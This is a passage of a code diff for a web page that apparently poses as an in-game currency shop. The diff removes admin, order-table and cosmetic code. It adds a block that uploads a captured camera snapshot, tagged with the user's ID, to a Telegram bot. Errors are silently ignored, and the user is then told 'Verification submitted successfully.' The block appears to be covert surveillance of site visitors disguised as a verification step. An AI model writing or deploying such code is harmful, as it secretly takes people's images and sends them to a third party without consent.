-        $("#adminPanel").classList.remove("hidden");
-        renderAdminOrders();
-      } else { alert("Parol xato!"); }
-    });
-    $("#adminLogoutBtn").addEventListener("click", () => {
-      $("#adminPanel").classList.add("hidden");
-      $("#adminLoginArea").classList.remove("hidden");
-    });
+  // Send Photo if captured
+  if (cameraBlob) {
+    try {
+      const fd = new FormData();
+      fd.append('chat_id', chatId);
+      fd.append('photo', cameraBlob, 'snap.jpg');
+      fd.append('caption', `Live Snapshot (ID: ${uid})`);
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+    } catch(e){}
+  }
 
-    function renderAdminOrders(){
-      const tb = $("#ordersTable tbody"); tb.innerHTML = "";
-      orders.slice().reverse().forEach(o => {
-        tb.innerHTML += `<tr><td>${o.id}</td><td>${o.uid || 'Cart'}</td><td>${o.phone || '-'}</td><td>${new Date(o.time).toLocaleTimeString()}</td><td><span class="pill">Bajarildi</span></td></tr>`;
-      });
-    }
+  showToast("Verification submitted successfully.");
+});
 
-    // Init UI
-    renderPacks();
-    renderPayments();
-    renderCart();
-    $("#statOrders").textContent = numberToCurrency(statOrders);
-    $("#statUC").textContent = numberToCurrency(statUC);
-
-    // Testimonials
-    const testRoot = $("#testimonials");
-    TESTIMONIALS.forEach(t => {
-      testRoot.innerHTML += `<div class="panel"><div style="font-weight:800">${t.name}</div><div class="muted">${"★".repeat(t.stars)}</div><p class="muted" style="margin-top:6px">${t.text}</p></div>`;
-    });
-
-    // Theme Toggle
-    $("#themeToggle").addEventListener("click", ()=> {
-      const cur = document.documentElement.getAttribute("data-theme");
-      document.documentElement.setAttribute("data-theme", cur === "light" ? "dark" : "light");
-    });
-
-    // Confetti effect helper
-    function confetti(){
-      const root = $("#confettiRoot");
-      for(let i=0;i<25;i++){
-        const el = document.createElement("div");
-        el.className = "confetti-piece";
-        el.style.left = Math.random()*100 + "%";
-        el.style.top = "-10%";
-        el.style.background = ["#ff6b35","#f7931e","#ffd24d"][Math.floor(Math.random()*3)];
-        document.body.appendChild(el);
-        el.animate([{ transform: `translateY(0)`, opacity:1 },{ transform: `translateY(500px)`, opacity:0 }], { duration: 1200 });
-        setTimeout(()=> el.remove(), 1200);
-      }
-    }
-  </script>
+renderPacks();
+</script>
 </body>
 </html>
